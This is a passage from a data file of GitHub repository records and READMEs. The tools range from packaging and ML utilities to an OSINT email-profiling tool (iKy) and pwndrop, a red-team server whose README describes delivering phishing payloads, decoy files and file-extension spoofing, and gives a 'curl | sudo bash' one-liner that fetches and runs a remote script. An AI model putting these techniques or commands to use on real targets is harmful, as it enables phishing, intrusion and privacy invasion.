JavaScript out of memory issue while building, try setting the\\nfollowing environment variable and rebuild:\\n\\n```\\nexport NODE_OPTIONS=\\\"--max-old-space-size=4096\\\"\\n```\\n\\n## Run in Development Mode\\n\\n```\\n./dev.sh -e http://elasticsearch:9200\\n```\\n\\nto run in development mode using an Elastic Search datastore at\\nhttp://elasticsearch:9200.\\n\\nThe connect your browser to http://localhost:4200. Note this port is\\ndifferent than the EveBox port, as the Angular CLI/Webpack development\\nserver is used to serve up the web application with backend requests\\nbeing proxied to the Go application.\\n\\nIn development mode changes to Go files will trigger a\\nrecompile/restart, and changes to the web app will trigger a recompile\\nof the javascript and a browser refresh.\\n\\n## Change Log\\n\\nSee https://github.com/jasonish/evebox/blob/master/CHANGELOG.md .\\n\\n## License\\n\\nAffero GPL.\\nhttps://www.gnu.org/licenses/agpl-3.0.en.html\\n\"", "topics": ["ids", "suricata", "netsec", "ips", "nsm", "security"], "writeup": "", "ignoredescription": false, "id": 38, "full_name": "jasonish/evebox", "url": "https://github.com/jasonish/evebox", "topic_string": "ids suricata netsec ips nsm security"},
{"tags": [], "owner": "jordansissel", "description": "Effing package management! Build packages for multiple platforms (deb, rpm, etc) with great ease and sanity.", "name": "fpm", "topics_string": "", "language": "Ruby", "readme": "\"fpm\\n===\\n\\n|Build| |Chat| |Gem|\\n\\nThe goal of fpm is to make it easy and quick to build packages such as rpms,\\ndebs, OSX packages, etc.\\n\\nfpm, as a project, exists to help you build packages, therefore:\\n\\n* If fpm is not helping you make packages easily, then there is a bug in fpm.\\n* If you are having a bad time with fpm, then there is a bug in fpm.\\n* If the documentation is confusing, then this is a bug in fpm.\\n\\nIf there is a bug in fpm, then we can work together to fix it. If you wish to\\nreport a bug/problem/whatever, I welcome you to do on `the project issue tracker`_.\\n\\n.. _the project issue tracker: https://github.com/jordansissel/fpm/issues\\n\\nYou can find out how to use fpm in the `documentation`_.\\n\\n.. _documentation: https://fpm.readthedocs.io/en/latest/\\n\\nYou can learn how to install fpm on your platform in the `installation guide`_.\\n\\n.. _installation guide: http://fpm.readthedocs.io/en/latest/installing.html\\n\\nProject Principles\\n------------------\\n\\n* Community: If a newbie has a bad time, it's a bug.\\n* Engineering: Make it work, then make it right, then make it fast.\\n* Capabilities: If it doesn't do a thing today, we can make it do it tomorrow.\\n\\n\\nBackstory\\n---------\\n\\nSometimes packaging is done wrong (because you can't do it right for all\\nsituations), but small tweaks can fix it.\\n\\nAnd sometimes, there isn't a package available for the tool you need.\\n\\nAnd sometimes if you ask \\\"How do I get python 3 on CentOS 5?\\\" some unhelpful\\ntrolls will tell you to \\\"Use another distro\\\"\\n\\nFurther, job switches have me flipping between Ubuntu and CentOS. These use\\ntwo totally different package systems with completely different packaging\\npolicies and support tools. Learning both was painful and confusing. I want to\\nsave myself (and you) that pain in the future.\\n\\nIt should be easy to say \\\"here's my install dir and here's some dependencies;\\nplease make a package\\\"\\n\\nThe Solution - FPM\\n------------------\\n\\nI wanted a simple way to create packages without needing to memorize too much.\\n\\nI wanted a tool to help me deliver software with minimal steps or training.\\n\\nThe goal of FPM is to be able to easily build platform-native packages.\\n\\nWith fpm, you can do many things, including:\\n\\n* Creating packages easily (deb, rpm, freebsd, etc)\\n* Tweaking existing packages (removing files, changing metadata/dependencies)\\n* Stripping pre/post/maintainer scripts from packages\\n\\n.. include: docs/installing\\n\\nThings that should work\\n-----------------------\\n\\nSources:\\n\\n* gem (even autodownloaded for you)\\n* python modules (autodownload for you)\\n* pear (also downloads for you)\\n* directories\\n* tar(.gz) archives\\n* rpm\\n* deb\\n* node packages (npm)\\n* pacman (ArchLinux) packages\\n\\nTargets:\\n\\n* deb\\n* rpm\\n* solaris\\n* freebsd\\n* tar\\n* directories\\n* Mac OS X `.pkg` files (`osxpkg`)\\n* pacman (ArchLinux) packages\\n\\n.. include: docs/contributing\\n\\n.. |Build| image:: https://img.shields.io/travis/jordansissel/fpm.svg\\n :target: https://travis-ci.org/jordansissel/fpm\\n.. |Chat| image:: https://img.shields.io/badge/irc-%23fpm%20on%20freenode-brightgreen.svg\\n :target: https://webchat.freenode.net/?channels=fpm\\n.. |Gem| image:: https://img.shields.io/gem/v/fpm.svg\\n :target: https://rubygems.org/gems/fpm\\n\"", "topics": ["packaging"], "writeup": "", "ignoredescription": false, "id": 39, "full_name": "jordansissel/fpm", "url": "https://github.com/jordansissel/fpm", "topic_string": "packaging"},
{"tags": [], "owner": "jrieke", "description": "\ud83d\udd27 Train off-the-shelf machine learning models with one line of code", "name": "traintool", "topics_string": "", "language": "Python", "readme": "\"<p align=\\\"center\\\">\\n <img src=\\\"docs/assets/cover.png\\\" alt=\\\"traintool\\\">\\n</p>\\n<p align=\\\"center\\\">\\n <em>Train off-the-shelf machine learning models with one line of code</em>\\n</p>\\n<p align=\\\"center\\\">\\n <b><a href=\\\"https://traintool.jrieke.com/\\\">Documentation</a> \\u2022 <a href=\\\"https://github.com/jrieke/traintool\\\">Github</a> \\u2022 <a href=\\\"mailto:johannes.rieke@gmail.com\\\">Contact</a></b>\\n</p>\\n<p align=\\\"center\\\">\\n <a href=\\\"https://github.com/jrieke/traintool/actions\\\"><img src=\\\"https://github.com/jrieke/traintool/workflows/build/badge.svg\\\" alt=\\\"build\\\"></a>\\n <a href=\\\"https://traintool.jrieke.com\\\"><img src=\\\"https://github.com/jrieke/traintool/workflows/docs/badge.svg\\\" alt=\\\"docs\\\"></a>\\n <a href=\\\"https://codecov.io/gh/jrieke/traintool\\\"><img src=\\\"https://codecov.io/gh/jrieke/traintool/branch/master/graph/badge.svg?token=NVH72ZXX8Z\\\" alt=\\\"codecov\\\"/></a>\\n</p>\\n\\n---\\n\\ntraintool is a Python library for **applied machine learning**. It allows you to train \\noff-the-shelf models with minimum code: You just give your data and say which model you \\nwant to train, and traintool takes care of the rest. It has **pre-implemented models** \\nfor most major use cases, works with different data formats and follows best practices \\nfor **experiment tracking** and **deployment**. \\n\\n<sup>Alpha Release: Note that traintool is in an early alpha release. The API can and will change \\nwithout notice. If you find a bug, please file an issue on [Github](https://github.com/jrieke/traintool) \\nor [write me](mailto:johannes.rieke@gmail.com).</sup>\\n\\n\\n## Installation\\n\\n```bash\\npip install git+https://github.com/jrieke/traintool\\n```\\n\\n## Is traintool for you?\\n\\n**YES** if you...\\n\\n- need to solve standard ML tasks with standard, off-the-shelf models\\n- prefer 98 % accuracy with one line of code over 98.1 % with 1000 lines\\n- want to compare different model types (e.g. deep network vs. SVM)\\n- care about experiment tracking & deployment\\n\\n\\n**NO** if you...\\n\\n- need to customize every aspect of your model, e.g. in basic research\\n- want to chase state of the art\\n\\n\\n## Features\\n\\n- **Minimum coding \\u2014** traintool is designed from the ground up to require as few lines of code as possible. It offers a sleek and intuitive interface that gets you started in seconds. Training a model just takes a single line:\\n\\n ```python\\n traintool.train(\\\"resnet18\\\", train_data, test_data)\\n ```\\n\\n- **Pre-implemented models \\u2014** traintool offers fully implemented and tested models \\u2013 from simple classifiers to deep neural networks. The alpha version supports image classification only but we will add more models soon. Here are only a few of the models you can use:\\n\\n ```python\\n \\\"svm\\\", \\\"random-forest\\\", \\\"alexnet\\\", \\\"resnet50\\\", \\\"inception_v3\\\", ...\\n ```\\n\\n- **Easy, yet fully customizable \\u2014** You can customize every aspect of the model training and hyperparameters. Simply pass along a config dictionary:\\n\\n ```python\\n traintool.train(..., config={\\\"optimizer\\\": \\\"adam\\\", \\\"lr\\\": 0.1})\\n ```\\n\\n- **Automatic experiment tracking \\u2014** traintool automatically calculates metrics and stores them \\u2013 without requiring you to write any code. You can visualize the results with tensorboard or stream directly to [comet.ml](https://www.comet.ml/).\\n\\n- **Automatic saving and checkpoints \\u2014** traintool automatically stores model checkpoints, logs, and experiment information in an intuitive directory structure. No more worrying about where you've put that one good experiment or which configuration it had. \\n\\n- **Works with multiple data formats \\u2014** traintool understands numpy arrays, pytorch datasets, or files and automatically converts them to the correct format for the model you train. \\n\\n- **Instant deployment \\u2014** You can deploy your model with one line of code to a REST API that you can query from anywhere. Just call:\\n\\n ```python\\n model.deploy()\\n ```\\n\\n- **Built on popular ML libraries \\u2014** Under the hood, traintool uses common open-source frameworks like pytorch, tensorflow, and scikit-learn. You can always access the raw models from these frameworks if you want to do more complex analysis:\\n\\n ```python\\n torch_model = model.raw()[\\\"model\\\"]\\n ```\\n\\n\\n\\n\\n<!--\\nFeatures & design principles:\\n\\n- **pre-implemented models** for most major use cases\\n- automatic experiment tracking with **tensorboard or comet.ml**\\n- instant **deployment** through REST API\\n- supports multiple data formats (numpy, pytorch/tensorflow, files, ...)\\n- access to raw models from sklearn/pytorch/tensorflow\\n-->\\n\\n\\n\\n## Example: Image classification on MNIST\\n\\n```python\\nimport mnist\\nimport traintool\\n\\n# Load MNIST data as numpy arrays (also works with torch/tensorflow datasets, files, ...)\\ntrain_data = [mnist.train_images(), mnist.train_labels()]\\ntest_data = [mnist.test_images(), mnist.test_labels()]\\n\\n# Train SVM\\nsvm = traintool.train(\\\"svm\\\", train_data=train_data, test_data=test_data)\\n\\n# Train ResNet with custom hyperparameters & track metrics to tensorboard\\nconfig = {\\\"lr\\\": 0.1, \\\"optimizer\\\": \\\"adam\\\"}\\nresnet = traintool.train(\\\"resnet\\\", train_data=train_data, test_data=test_data, \\n config=config, tensorboard=True)\\n\\n# Make prediction\\nresult = resnet.predict(test_data[0][0])\\nprint(result[\\\"predicted_class\\\"])\\n\\n# Deploy to REST API (with fastapi)\\nresnet.deploy()\\n\\n# Get underlying pytorch model (e.g. for custom analysis)\\npytorch_model = resnet.raw()[\\\"model\\\"]\\n```\\n\\nInterested? Have a look at the [tutorial](https://traintool.jrieke.com/tutorial/) or check \\nout available [models](https://traintool.jrieke.com/models/).\\n\\n\\n## Get in touch!\\n\\nYou have a question on traintool, want to use it in production, or miss a feature? I'm \\nhappy to hear from you! Write me at [johannes.rieke@gmail.com](mailto:johannes.rieke@gmail.com). \\n\"", "topics": ["numpy", "ai", "machine-learning", "pytorch"], "writeup": "traintool is a Python library for applied machine learning. It allows you to train off-the-shelf models with minimum code: You just give your data and say which model you want to train, and traintool takes care of the rest. It has pre-implemented models for most major use cases, works with different data formats and follows best practices for experiment tracking and deployment.\n", "ignoredescription": true, "id": 40, "full_name": "jrieke/traintool", "url": "https://github.com/jrieke/traintool", "topic_string": "numpy ai machine-learning pytorch"},
{"tags": [], "owner": "jroimartin", "description": "Python package for CTFs and exploit development", "name": "explib", "topics_string": "", "language": "Python", "readme": "\"# explib\\n\\nPython package for CTFs and exploit development.\\n\\nHeavily based on [pwntools](http://pwntools.com).\\n\\n## Installation\\n\\nFor development purposes, execute the following command from a venv:\\n\\n```\\n$ pip install -e .\\n```\\n\\n## Documentation\\n\\n```\\n$ python -m pydoc explib\\n```\\n\"", "topics": ["pwn", "exploiting", "ctf"], "writeup": "", "ignoredescription": false, "id": 41, "full_name": "jroimartin/explib", "url": "https://github.com/jroimartin/explib", "topic_string": "pwn exploiting ctf"},
{"tags": [], "owner": "JustAnotherArchivist", "description": "A social networking service scraper in Python", "name": "snscrape", "topics_string": "", "language": "Python", "readme": "\"# snscrape\\nsnscrape is a scraper for social networking services (SNS). It scrapes things like user profiles, hashtags, or searches and returns the discovered items, e.g. the relevant posts. \\n\\nThe following services are currently supported:\\n* Facebook: user profiles, groups, and communities (aka visitor posts)\\n* Instagram: user profiles, hashtags, and locations\\n* Telegram: channels\\n* Twitter: user profiles, hashtags, searches, threads, and lists (members as well as posts)\\n* VKontakte: user profiles\\n\\n## Requirements\\nsnscrape requires Python 3.6 or higher. The Python package dependencies are installed automatically when you install snscrape.\\n\\nNote that one of the dependencies, lxml, also requires libxml2 and libxslt to be installed.\\n\\n## Installation\\n pip3 install snscrape\\n\\nIf you want to use the development version:\\n\\n pip3 install git+https://github.com/JustAnotherArchivist/snscrape.git\\n\\n## Usage\\nTo get all tweets by Jason Scott (@textfiles):\\n\\n snscrape twitter-user textfiles\\n\\nIt's usually useful to redirect the output to a file for further processing, e.g. in bash using the filename `@textfiles-tweets`:\\n```bash\\nsnscrape twitter-user textfiles >twitter-@textfiles\\n```\\n\\nTo get the latest 100 tweets with the hashtag #archiveteam:\\n\\n snscrape --max-results 100 twitter-hashtag archiveteam\\n\\n`snscrape --help` or `snscrape <module> --help` provides details on the available options. `snscrape --help` also lists all available modules.\\n\\nIt is also possible to use snscrape as a library in Python, but this is currently undocumented.\\n\\n## Issue reporting\\nIf you discover an issue with snscrape, please report it at <https://github.com/JustAnotherArchivist/snscrape/issues>. If possible please run snscrape with `-vv` and `--dump-locals` and include the log output as well as the dump files referenced in the log in the issue. Note that the files may contain sensitive information in some cases and could potentially be used to identify you (e.g. if the service includes your IP address in its response). If you prefer to arrange a file transfer privately, just mention that in the issue.\\n\\n## License\\nThis program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.\\n\\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.\\n\\nYou should have received a copy of the GNU General Public License along with this program. If not, see <https://www.gnu.org/licenses/>.\\n\"", "topics": ["osint", "social-network", "scraper", "social-media"], "writeup": "snscrape is a scraper for social networking services (SNS). It scrapes things like user profiles, hashtags, or searches and returns the discovered items, e.g. the relevant posts. Scrapes Facebook, Instagram, Twitter, Telegram, VKontakte.\n", "ignoredescription": false, "id": 42, "full_name": "JustAnotherArchivist/snscrape", "url": "https://github.com/JustAnotherArchivist/snscrape", "topic_string": "osint social-network scraper social-media"},
{"tags": [], "owner": "kennbroorg", "description": "OSINT Project", "name": "iKy", "topics_string": "", "language": "TypeScript", "readme": "\"<div align=\\\"center\\\">\\n <a href=\\\"https://twitter.com/intent/follow?screen_name=kennbroorg\\\">\\n\\t<img alt=\\\"follow on Twitter\\\" src=\\\"https://img.shields.io/twitter/follow/kennbroorg.svg?label=follow%20%40kennbroorg&style=social\\\">\\n </a>\\n</div>\\n\\n---\\n\\n<div align=\\\"center\\\">\\n <img alt=\\\"Redis\\\" src=\\\"https://img.shields.io/badge/storage-redis-red.svg\\\">\\n <img alt=\\\"Python\\\" src=\\\"https://img.shields.io/badge/python-3.7-informational.svg\\\">\\n <img alt=\\\"Celery\\\" src=\\\"https://img.shields.io/badge/multiprocessing-celery-green.svg\\\">\\n <img alt=\\\"Flask\\\" src=\\\"https://img.shields.io/badge/interface-flask-yellowgreen.svg\\\">\\n</div>\\n<div align=\\\"center\\\">\\n <img alt=\\\"Node\\\" src=\\\"https://img.shields.io/badge/node-12.x-brightgreen.svg\\\">\\n <img alt=\\\"Angular\\\" src=\\\"https://img.shields.io/badge/web%20framwork-angular%207-red.svg\\\">\\n <img alt=\\\"Boostrap\\\" src=\\\"https://img.shields.io/badge/toolkit-boostrap-blueviolet.svg\\\">\\n <img alt=\\\"UI Kit\\\" src=\\\"https://img.shields.io/badge/UI%20Kit-Nebular-9cf.svg\\\">\\n</div>\\n<div align=\\\"center\\\">\\n <img alt=\\\"fullcontact\\\" src=\\\"https://img.shields.io/badge/module-fullcontact-blue.svg\\\">\\n <img alt=\\\"twitter\\\" src=\\\"https://img.shields.io/badge/module-twitter-blue.svg\\\">\\n <img alt=\\\"linkedin\\\" src=\\\"https://img.shields.io/badge/module-linkedin-blue.svg\\\">\\n <img alt=\\\"github\\\" src=\\\"https://img.shields.io/badge/module-github-blue.svg\\\">\\n <img alt=\\\"keybase\\\" src=\\\"https://img.shields.io/badge/module-keybase-blue.svg\\\">\\n <img alt=\\\"ghostproject\\\" src=\\\"https://img.shields.io/badge/module-ghostproject-red.svg\\\">\\n <img alt=\\\"haveibeenpwned\\\" src=\\\"https://img.shields.io/badge/module-haveibeenpwned-blue.svg\\\">\\n <img alt=\\\"emailrep.io\\\" src=\\\"https://img.shields.io/badge/amodule-emailrep.io-blue.svg\\\">\\n <img alt=\\\"socialscan\\\" src=\\\"https://img.shields.io/badge/module-socialscan-blue.svg\\\">\\n <img alt=\\\"instagram\\\" src=\\\"https://img.shields.io/badge/module-instagram-blue.svg\\\">\\n <img alt=\\\"tiktok\\\" src=\\\"https://img.shields.io/badge/module-tiktok-blue.svg\\\">\\n <img alt=\\\"sherlock\\\" src=\\\"https://img.shields.io/badge/module-sherlock-blue.svg\\\">\\n <img alt=\\\"skype\\\" src=\\\"https://img.shields.io/badge/module-skype-blue.svg\\\">\\n <img alt=\\\"tinder\\\" src=\\\"https://img.shields.io/badge/module-tinder-blue.svg\\\">\\n <img alt=\\\"venmo\\\" src=\\\"https://img.shields.io/badge/module-venmo-blue.svg\\\">\\n <img alt=\\\"darkpass\\\" src=\\\"https://img.shields.io/badge/module-darkpass-blue.svg\\\">\\n <img alt=\\\"tweetiment\\\" src=\\\"https://img.shields.io/badge/module-tweetiment-blue.svg\\\">\\n <img alt=\\\"peopledatalabs\\\" src=\\\"https://img.shields.io/badge/module-peopledatalabs-blue.svg\\\">\\n <img alt=\\\"reddit\\\" src=\\\"https://img.shields.io/badge/module-reddit-blue.svg\\\">\\n <img alt=\\\"leaklookup\\\" src=\\\"https://img.shields.io/badge/module-leaklookup-blue.svg\\\">\\n</div>\\n\\n---\\n\\n<div align=\\\"center\\\">\\n <a href=\\\"https://gitlab.com/kennbroorg/iKy/blob/iKy/README.es.md\\\">\\n\\t<img alt=\\\"README Espanol\\\" src=\\\"https://img.shields.io/badge/README-Espa%C3%B1ol-orange.svg\\\">\\n </a>\\n</div>\\n\\n---\\n\\n<div align=\\\"center\\\">\\n <img alt=\\\"Logo\\\" src=\\\"https://kennbroorg.gitlab.io/ikyweb/assets/img/Logo-Circular.png\\\">\\n</div>\\n\\n---\\n\\n# iKy\\n\\n## Description\\nProject iKy is a tool that collects information from an email and shows results in a nice visual interface.\\n\\nVisit the Gitlab Page of the [Project](https://kennbroorg.gitlab.io/ikyweb/)\\n\\n<div align=\\\"center\\\">\\n <a href=\\\"https://vimeo.com/434501702\\\"><img src=\\\"frontend/src/assets/images/Giba.gif\\\"></a>\\n</div>\\n\\n[Video Demo](https://vimeo.com/434501702 \\\"Video Demo - Click to Watch!\\\")\\n\\n## Installation\\n\\n### Clone repository\\n\\n```shell\\ngit clone https://gitlab.com/kennbroorg/iKy.git\\n```\\n\\n### Install Backend\\n\\n#### Redis\\n\\nYou must install Redis\\n\\n```shell\\nwget http://download.redis.io/redis-stable.tar.gz\\ntar xvzf redis-stable.tar.gz\\ncd redis-stable\\nmake\\nsudo make install\\n```\\n\\n#### Python stuff and Celery\\n\\nYou must install the libraries inside requirements.txt\\n\\n```shell\\npython3 -m pip install -r requirements.txt\\n```\\n\\n### Install Frontend\\n\\n#### Node\\n\\nFirst of all, install [nodejs](https://nodejs.org/en/).\\n\\n#### Dependencias\\n\\nInside the directory **frontend** install the dependencies\\n\\n```shell\\ncd frontend\\nnpm install\\n```\\n\\n## Wake up iKy Tool\\n\\n### Turn on Backend\\n\\n#### Redis\\n\\nTurn on the server in a terminal\\n\\n```shell\\nredis-server\\n```\\n\\n#### Python stuff and Celery\\n\\nTurn on Celery in another terminal, within the directory **backend**\\n\\n```shell\\n./celery.sh\\n```\\n\\nAgain, in another terminal turn on backend app from directory **backend** \\n\\n```shell\\npython3 app.py\\n```\\n\\n### Turn on Frontend\\n\\nFinally, to run frontend server, execute the following command from directory **frontend**\\n\\n```shell\\nnpm start\\n```\\n\\n### Screen after turn on iKy\\n\\n<div align=\\\"center\\\">\\n <img src=\\\"frontend/src/assets/images/Screens1000.png\\\">\\n</div>\\n\\n### Browser\\n\\nOpen the browser in this [url](http://127.0.0.1:4200) \\n\\n### Config API Keys\\n\\nOnce the application is loaded in the browser, you should go to the Api Keys option and load the values of the APIs that are needed.\\n\\n- Fullcontact: Generate the APIs from [here](https://support.fullcontact.com/hc/en-us/articles/115003415888-Getting-Started-FullContact-v2-APIs)\\n- PeopleDataLabs : Generate the APIs from [aqu\\u00ed](https://www.peopledatalabs.com/signup)\\n- Linkedin: Only the user and password of your account must be loaded\\n- Instagram: Only the user and password of your account must be loaded\\n- HaveIBeenPwned : Generate the APIs from [here](https://haveibeenpwned.com/API/Key) (Paid)\\n- Emailrep.io : Generate the APIs from [here](https://emailrep.io/key)\\n- Leaklookup : Generate the APIs from [here](https://leak-lookup.com/api)\\n- Twitter: Generate the APIs from [here](https://developer.twitter.com/en/docs/basics/authentication/guides/access-tokens.html)\\n\\n# Wiki\\n\\n- [iKy Wiki](https://gitlab.com/kennbroorg/iKy/-/wikis/home)\\n- [iKy Page](https://kennbroorg.gitlab.io/ikyweb/)\\n- Installation\\n - [Easy Install](https://gitlab.com/kennbroorg/iKy/-/wikis/Installation/EasyInstall)\\n - [Vagrant](https://gitlab.com/kennbroorg/iKy/-/wikis/Installation/Vagrant)\\n - [Manual install (Compacted)](https://gitlab.com/kennbroorg/iKy/-/wikis/Installation/Manual-install-(Compacted))\\n - [Manual install (Detailed)](https://gitlab.com/kennbroorg/iKy/-/wikis/Installation/Manual-install-(Detailed))\\n- Update\\n - [Soft Update](https://gitlab.com/kennbroorg/iKy/-/wikis/Update/Soft)\\n- Wake Up \\n - [Turn on the project](https://gitlab.com/kennbroorg/iKy/-/wikis/Wakeup/WakeUp)\\n- APIs\\n - [APIs through frontend](https://gitlab.com/kennbroorg/iKy/-/wikis/APIs/ApiKeys-through-the-browser)\\n - [APIs through backend](https://gitlab.com/kennbroorg/iKy/-/wikis/APIs/APIs-through-the-backend)\\n- Backend\\n - [Backend through URL](https://gitlab.com/kennbroorg/iKy/-/wikis/Backend/Backend-through-url)\\n- Videos\\n - [Installation videos](https://gitlab.com/kennbroorg/iKy/-/wikis/Videos/Installations)\\n - [Installation in Kali 2019](https://vimeo.com/350877994) \\n - [Installation in ubuntu 18.04](https://vimeo.com/347435255) \\n - [Installation in ubuntu 16.04](https://vimeo.com/332359273) \\n - [Demo videos](https://gitlab.com/kennbroorg/iKy/-/wikis/Videos/Demos)\\n - [iKy eko15](https://vimeo.com/397862772)\\n - [iKy version 2](https://vimeo.com/347085110)\\n - [Testing iKy with Emiliano](https://vimeo.com/349011105)\\n - [Testing iKy with Giba](https://vimeo.com/342843348)\\n - [iKy version 1](https://vimeo.com/326114716)\\n - [iKy version 0](https://vimeo.com/272495754)\\n- [Disclaimer](https://gitlab.com/kennbroorg/iKy/-/wikis/Disclaimer)\\n\\n## Demo Video\\n\\n<div align=\\\"center\\\">\\n <a href=\\\"https://vimeo.com/434501702\\\"><img alt=\\\"Kali 2019\\\" src=\\\"frontend/src/assets/images/iKyEko15.png\\\"></a>\\n <p>iKy eko15</p>\\n</div>\\n\\n## Disclaimer\\n\\nAnyone who contributes or contributed to the project, including me, is not responsible for the use of the tool (Neither the legal use nor the illegal use, nor the \\\"other\\\" use).\\n\\nKeep in mind that this software was initially written for a joke, then for educational purposes (to educate ourselves), and now the goal is to collaborate with the community making quality free software, and while the quality is not excellent (sometimes not even good) we strive to pursue excellence.\\n\\nConsider that all the information collected is free and available online, the tool only tries to discover, collect and display it.\\nMany times the tool cannot even achieve its goal of discovery and collection. Please load the necessary APIs before remembering my mother.\\nIf even with the APIs it doesn't show \\\"nice\\\" things that you expect to see, try other e-mails before you remember my mother.\\nIf you still do not see the \\\"nice\\\" things you expect to see, you can create an issue, contact us by e-mail or by any of the RRSS, but keep in mind that my mother is neither the creator nor Contribute to the project.\\n\\nWe do not refund your money if you are not satisfied.\\nI hope you enjoy using the tool as much as we enjoy doing it. The effort was and is enormous (Time, knowledge, coding, tests, reviews, etc.) but we would do it again.\\nDo not use the tool if you cannot read the instructions and / or this disclaimer clearly.\\n\\nBy the way, for those who insist on remembering my mother, she died many years ago but I love her as if she were right here.\\n\\n[readmees]: README.es.md\\n[readmeen]: README.md\\n\"", "topics": ["keybase", "email", "twitter", "offensive", "linkedin", "timeline", "osint", "reconnaissance", "hibp", "github", "profile", "security", "intelligence", "gitlab"], "writeup": "", "ignoredescription": false, "id": 43, "full_name": "kennbroorg/iKy", "url": "https://github.com/kennbroorg/iKy", "topic_string": "keybase email twitter offensive linkedin timeline osint reconnaissance hibp github profile security intelligence gitlab"},
{"tags": [], "owner": "kgretzky", "description": "Self-deployable file hosting service for red teamers, allowing to easily upload and share payloads over HTTP and WebDAV.", "name": "pwndrop", "topics_string": "", "language": "JavaScript", "readme": "\"<p align=\\\"center\\\">\\n <img alt=\\\"pwndrop logo\\\" src=\\\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/pwndrop-logo-512.png\\\" height=\\\"120\\\" />\\n <p align=\\\"center\\\">\\n <img alt=\\\"pwndrop title\\\" src=\\\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/pwndrop-title-black-512.png\\\" height=\\\"40\\\" />\\n </p>\\n</p>\\n\\n**pwndrop** is a self-deployable file hosting service for sending out red teaming payloads or securely sharing your private files over HTTP and WebDAV.\\n\\nIf you've ever needed to quickly set up an nginx/apache web server to host your files and you were never happy with the limitations of `python -m SimpleHTTPServer`, **pwndrop** is definitely for you!\\n\\n<p align=\\\"center\\\">\\n <img alt=\\\"demo\\\" src=\\\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/demo1.gif\\\" height=\\\"500\\\" />\\n</p>\\n\\nWith **pwndrop** you can:\\n- [x] Upload and immediately share multiple files using your own private VPS, using drag & drop.\\n- [x] Decide to make files available or unavailable for download with a single click.\\n- [x] Set up custom download URLs, for shared files, without playing with directory structure.\\n- [x] Set up facade files, which will be served instead of the original file whenever you feel like it.\\n- [x] Set up automatic redirects to spoof the file's extension in a shared link.\\n- [x] Change MIME type of the served file to change browser's behavior when a download link is clicked.\\n- [x] Serve files over HTTP, HTTPS and WebDAV.\\n- [x] Install and setup everything using a bash oneliner.\\n- [x] Set up **pwndrop** to work as a nameserver and respond with a valid DNS A record to any sub-domain you choose.\\n- [x] Protect your admin panel behind a custom secret URL path and log in securely with your own username and password.\\n- [x] Never worry about setting up HTTPS certificates as **pwndrop** does everything for you in the background (including auto-renewals).\\n\\nIts main goal is to make file sharing as easy and intuitive as possible, while implementing extra features to aid in red team assessments.\\n\\nFrontend of **pwndrop** is developed in pure Vue.js + Bootstrap with no npm or webpack dependencies. The backend serves REST API and manages a local database, powered by GO language.\\n\\n## Write-up\\n\\nIf you want to learn how to use **pwndrop** or you want to learn what new features were implemented in recent releases, make sure to check out the posts on my blog:\\n\\nhttps://breakdev.org/pwndrop\\n\\n## Video guide\\n\\nTake a look at the fantastic video made by Luke Turvey ([@TurvSec](https://twitter.com/TurvSec)), which fully explains how to get started using **pwndrop**.\\n\\n[![File and Phishing Payload Hosting using PwnDrop (Red Team) - Luke Turvey](https://img.youtube.com/vi/e3veSyIFvOE/0.jpg)](https://www.youtube.com/watch?v=e3veSyIFvOE)\\n\\n## Prerequisites\\n\\nIf you don't yet have the server to deploy to I highly recommend Digital Ocean. The cheapest $5/mo Debian 9 server with 25GB of storage space will work wonders for you. You can use my referral link to [get an extra $100 to spend on your servers in 60 days for free](https://m.do.co/c/50338abc7ffe).\\n\\nRegister a new domain and point its DNS A records to your VPS IP. You can also register a domain and point its `ns1` and `ns2` nameservers to **pwndrop** instance IP - it will automatically respond with valid DNS A replies.\\n\\n1. Registered domain name pointing to **pwndrop** instance IP as a DNS A records or as a nameserver.\\n2. Server with at least 512 MB RAM.\\n\\nIf you want to set up **pwndrop** without a domain, check below how to set up a local instance, which will not auto-generate HTTPS certificates.\\n\\n## Installation\\n\\nMake sure there aren't any DNS or HTTP(S) servers running before you attempt to install **pwndrop**.\\n\\n#### Oneliner\\n\\nI do not recommend running oneliners, before downloading and checking the script code, but if you are really in a hurry, here it is:\\n```\\ncurl https://raw.githubusercontent.com/kgretzky/pwndrop/master/install_linux.sh | sudo bash\\n```\\n\\nThis will download the latest amd64 release binary and fully install a daemon running in a background.\\n\\n#### From binary\\n\\nFirst you need to download the release package you want from: https://github.com/kgretzky/pwndrop/releases\\n\\nThen do the following (this performs same actions to the oneliner):\\n\\n```\\ntar zxvf pwndrop-linux-amd64.tar.gz\\n./pwndrop stop\\n./pwndrop install\\n./pwndrop start\\n./pwndrop status\\n```\\n\\n#### From source code\\n\\nFirst of all, make sure you have installed GO with version at least **1.13**: https://golang.org/doc/install\\n\\nThen do the following:\\n\\n```\\ngit clone https://github.com/kgretzky/pwndrop\\ncd pwndrop\\nmake\\nmake install\\n```\\n\\n## Quickstart\\n\\nMake sure the **pwndrop** is running.\\n\\n1. Open the secret URL to authorize your browser: `https://yourdomain.com/pwndrop` (this is a default value; make sure to use the secret path, you've pre-configured)\\n2. Open the admin panel URL in your browser: `https://yourdomain.com/` (since you've authorized your browser, you will now see an admin panel login page)\\n3. Create your admin account or login.\\n4. Click the configuration cog in top-left corner and make sure you change the secret path to something other than `/pwndrop`.\\n\\nYou're good to go!\\n\\n## Running from CLI\\n\\nYou don't have to install **pwndrop** as a daemon and you can run it straight from the console.\\n\\n```\\nusage: pwndrop [start|stop|install|remove|status] [-config <config_path>] [-debug] [-no-autocert] [-no-dns] [-h]\\n\\ndaemon management:\\n start : start the daemon\\n stop : stop the daemon\\n install : install the daemon using the available system manager (systemd, systemv and upstart supported)\\n remove : uninstall the daemon\\n status : check status of the installed daemon\\n\\nparameters:\\n -config : specify a custom path to a config file (def. 'pwndrop.ini' in same directory as the executable)\\n -debug : enable debug output \\n -no-autocert : disable automatic TLS certificate retrieval from LetsEncrypt; useful when you want to connect over IP or/and in a local network\\n -no-dns : do not run a DNS server on port 53 UDP; use this if you don't want to use pwndrop as a nameserver\\n -h : usage help\\n```\\n\\n## Configuration\\n\\nOn first launch, **pwndrop**, by default, will create a new configuration file `pwndrop.ini` in the same directory as an executable. You can later modify it or supply your own, for example to pre-configure 